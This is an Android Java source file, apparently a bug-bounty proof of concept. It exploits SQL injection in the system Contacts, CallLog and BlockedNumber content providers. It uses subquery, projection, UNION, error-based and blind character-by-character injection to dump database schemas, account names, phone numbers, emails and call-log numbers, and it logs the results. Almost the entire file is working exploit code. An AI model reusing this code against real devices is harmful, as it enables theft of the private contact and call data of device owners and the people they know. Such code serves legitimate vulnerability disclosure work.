package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class ContactsCallLogSqliActivity extends Activity {
    private static final String TAG = "ContactsCallLogSQLi";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(9);
        logView.setText("Contacts + CallLog + BlockedNumber SQLi PoC\nUID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);

        testContactsSqli();
        testCallLogSqli();
        testBlockedNumberSqli();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void testContactsSqli() {
        log("=== ContactsProvider SQL Injection ===");
        Uri contactsUri = Uri.parse("content://com.android.contacts/contacts");

        // Step 1: Normal query to get column count
        try {
            Cursor c = getContentResolver().query(contactsUri, null, null, null, null);
            if (c != null) {
                log("Normal query: " + c.getCount() + " contacts, " + c.getColumnCount() + " cols");
                c.close();
            }
        } catch (Exception e) {
            log("Normal query error: " + e.getMessage());
        }

        // Step 2: Subquery injection to extract table count from sqlite_master
        try {
            String sel = "(SELECT count(*) FROM sqlite_master WHERE type='table') > 0";
            Cursor c = getContentResolver().query(contactsUri, null, sel, null, null);
            if (c != null) {
                log("Subquery (table count > 0): " + c.getCount() + " rows returned");
                c.close();
            }
        } catch (Exception e) {
            log("Subquery error: " + e.getMessage());
        }

        // Step 3: Extract table names via blind SQLi
        log("--- Extracting table names via blind SQLi ---");
        extractBlindValue(contactsUri, "sqlite_master", "name", "type='table'", 5);

        // Step 4: Projection subquery injection
        log("--- Projection subquery injection ---");
        try {
            String[] proj = {"(SELECT group_concat(name,'|||') FROM sqlite_master WHERE type='table') AS tables"};
            Cursor c = getContentResolver().query(contactsUri, proj, null, null, null);
            if (c != null && c.moveToFirst()) {
                String tables = c.getString(0);
                if (tables != null) {
                    log("[VULN!] Projection injection - ALL tables: " + tables);
                } else {
                    log("Projection: null result");
                }
                c.close();
            }
        } catch (Exception e) {
            log("Projection injection error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Step 5: Extract _sync_state data (cross-table PII)
        log("--- Cross-table data extraction ---");
        try {
            String[] proj = {"(SELECT group_concat(account_name||':'||account_type,'|||') FROM accounts) AS accts"};
            Cursor c = getContentResolver().query(contactsUri, proj, null, null, null);
            if (c != null && c.moveToFirst()) {
                String accts = c.getString(0);
                log("[VULN!] Accounts table: " + accts);
                c.close();
            }
        } catch (Exception e) {
            log("Accounts extraction: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Step 6: Extract phone numbers from internal data table
        try {
            String[] proj = {"(SELECT group_concat(data1,'|||') FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/phone_v2') LIMIT 10) AS phones"};
            Cursor c = getContentResolver().query(contactsUri, proj, null, null, null);
            if (c != null && c.moveToFirst()) {
                String phones = c.getString(0);
                log("[VULN!] Phone numbers from internal data table: " + phones);
                c.close();
            }
        } catch (Exception e) {
            log("Phone extraction: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Step 7: Extract emails
        try {
            String[] proj = {"(SELECT group_concat(data1,'|||') FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/email_v2') LIMIT 10) AS emails"};
            Cursor c = getContentResolver().query(contactsUri, proj, null, null, null);
            if (c != null && c.moveToFirst()) {
                String emails = c.getString(0);
                log("[VULN!] Emails from internal data table: " + emails);
                c.close();
            }
        } catch (Exception e) {
            log("Email extraction: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Step 8: Extract complete schema via projection
        try {
            String[] proj = {"(SELECT group_concat(sql,'|||') FROM sqlite_master WHERE type='table' AND sql IS NOT NULL) AS schema"};
            Cursor c = getContentResolver().query(contactsUri, proj, null, null, null);
            if (c != null && c.moveToFirst()) {
                String schema = c.getString(0);
                if (schema != null) {
                    log("[VULN!] Full schema (" + schema.length() + " chars):");
                    // Log in chunks
                    int chunk = 0;
                    while (chunk < schema.length() && chunk < 2000) {
                        int end = Math.min(chunk + 200, schema.length());
                        log("  " + schema.substring(chunk, end));
                        chunk = end;
                    }
                }
                c.close();
            }
        } catch (Exception e) {
            log("Schema extraction: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Step 9: UNION injection (from app context, not ADB shell)
        try {
            Cursor normal = getContentResolver().query(contactsUri, null, null, null, null);
            if (normal != null) {
                int cols = normal.getColumnCount();
                normal.close();
                StringBuilder union = new StringBuilder("1=0) UNION SELECT sql");
                for (int i = 2; i <= cols; i++) union.append(",").append(i);
                union.append(" FROM sqlite_master WHERE type='table'--");
                Cursor sqli = getContentResolver().query(contactsUri, null, union.toString(), null, null);
                if (sqli != null) {
                    int count = sqli.getCount();
                    log("UNION injection: " + count + " rows (cols=" + cols + ")");
                    if (count > 0 && sqli.moveToFirst()) {
                        for (int i = 0; i < Math.min(count, 5); i++) {
                            String val = sqli.getString(0);
                            if (val != null && val.length() > 120) val = val.substring(0, 120) + "...";
                            log("  TABLE: " + val);
                            if (!sqli.moveToNext()) break;
                        }
                    }
                    sqli.close();
                }
            }
        } catch (Exception e) {
            log("UNION injection: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        log("");
    }

    private void testCallLogSqli() {
        log("=== CallLogProvider SQL Injection ===");
        Uri callLogUri = Uri.parse("content://call_log/calls");

        // Step 1: Normal query
        try {
            Cursor c = getContentResolver().query(callLogUri, null, null, null, null);
            if (c != null) {
                log("Normal query: " + c.getCount() + " calls, " + c.getColumnCount() + " cols");
                c.close();
            }
        } catch (Exception e) {
            log("Normal query error: " + e.getMessage());
        }

        // Step 2: Subquery injection (confirmed by background agent)
        try {
            String sel = "(SELECT count(*) FROM sqlite_master WHERE type='table') > 0";
            Cursor c = getContentResolver().query(callLogUri, null, sel, null, null);
            if (c != null) {
                log("[VULN!] Subquery passed: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("Subquery error: " + e.getMessage());
        }

        // Step 3: Projection subquery to extract tables
        try {
            String[] proj = {"(SELECT group_concat(name,'|||') FROM sqlite_master WHERE type='table') AS tables"};
            Cursor c = getContentResolver().query(callLogUri, proj, null, null, null);
            if (c != null && c.moveToFirst()) {
                String tables = c.getString(0);
                log("[VULN!] CallLog tables: " + tables);
                c.close();
            }
        } catch (Exception e) {
            log("Projection injection: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Step 4: Extract phone numbers from calls table
        try {
            String[] proj = {"(SELECT group_concat(number,'|||') FROM calls LIMIT 20) AS numbers"};
            Cursor c = getContentResolver().query(callLogUri, proj, null, null, null);
            if (c != null && c.moveToFirst()) {
                String numbers = c.getString(0);
                log("[VULN!] Call numbers: " + numbers);
                c.close();
            }
        } catch (Exception e) {
            log("Call number extraction: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Step 5: Extract full schema
        try {
            String[] proj = {"(SELECT group_concat(sql,'|||') FROM sqlite_master WHERE type='table') AS schema"};
            Cursor c = getContentResolver().query(callLogUri, proj, null, null, null);
            if (c != null && c.moveToFirst()) {
                String schema = c.getString(0);
                if (schema != null) {
                    log("[VULN!] CallLog full schema (" + schema.length() + " chars): " + schema.substring(0, Math.min(schema.length(), 300)));
                }
                c.close();
            }
        } catch (Exception e) {
            log("Schema extraction: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        log("");
    }

    private void testBlockedNumberSqli() {
        log("=== BlockedNumberProvider SQL Injection ===");
        Uri blockedUri = Uri.parse("content://com.android.blockednumber/blocked");

        // Step 1: Normal query
        try {
            Cursor c = getContentResolver().query(blockedUri, null, null, null, null);
            if (c != null) {
                log("Normal query: " + c.getCount() + " blocked, " + c.getColumnCount() + " cols");
                c.close();
            }
        } catch (Exception e) {
            log("Normal query error: " + e.getMessage());
        }

        // Step 2: Error-based SQLi confirmation
        try {
            String sel = "(SELECT 1 FROM nonexistent_table_xyz) = 1";
            Cursor c = getContentResolver().query(blockedUri, null, sel, null, null);
            if (c != null) {
                log("Error-based test: " + c.getCount() + " rows (should have errored)");
                c.close();
            }
        } catch (Exception e) {
            if (e.getMessage() != null && e.getMessage().contains("no such table")) {
                log("[VULN!] Error-based SQLi confirmed: " + e.getMessage());
            } else {
                log("Error-based: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            }
        }

        // Step 3: Projection injection
        try {
            String[] proj = {"(SELECT group_concat(name,'|||') FROM sqlite_master WHERE type='table') AS tables"};
            Cursor c = getContentResolver().query(blockedUri, proj, null, null, null);
            if (c != null && c.moveToFirst()) {
                String tables = c.getString(0);
                log("[VULN!] BlockedNumber tables: " + tables);
                c.close();
            }
        } catch (Exception e) {
            log("Projection: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Step 4: Extract schema
        try {
            String[] proj = {"(SELECT group_concat(sql,'|||') FROM sqlite_master WHERE type='table') AS schema"};
            Cursor c = getContentResolver().query(blockedUri, proj, null, null, null);
            if (c != null && c.moveToFirst()) {
                String schema = c.getString(0);
                log("[VULN!] BlockedNumber schema: " + schema);
                c.close();
            }
        } catch (Exception e) {
            log("Schema: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        log("\n=== ALL TESTS COMPLETE ===");
    }

    private void extractBlindValue(Uri uri, String table, String column, String where, int maxChars) {
        StringBuilder extracted = new StringBuilder();
        for (int pos = 1; pos <= maxChars * 20; pos++) {
            boolean found = false;
            for (char ch = 32; ch < 127; ch++) {
                try {
                    String sel = "(SELECT substr(" + column + "," + pos + ",1) FROM " + table + " WHERE " + where + " LIMIT 1) = '" + ch + "'";
                    Cursor c = getContentResolver().query(uri, null, sel, null, null);
                    if (c != null) {
                        int count = c.getCount();
                        c.close();
                        if (count > 0) {
                            extracted.append(ch);
                            found = true;
                            break;
                        }
                    }
                } catch (Exception e) {
                    break;
                }
            }
            if (!found) break;
            if (extracted.length() % 30 == 0) {
                log("  Blind extraction progress: " + extracted.toString());
            }
        }
        if (extracted.length() > 0) {
            log("[VULN!] Blind SQLi extracted: " + extracted.toString());
        }
    }
}
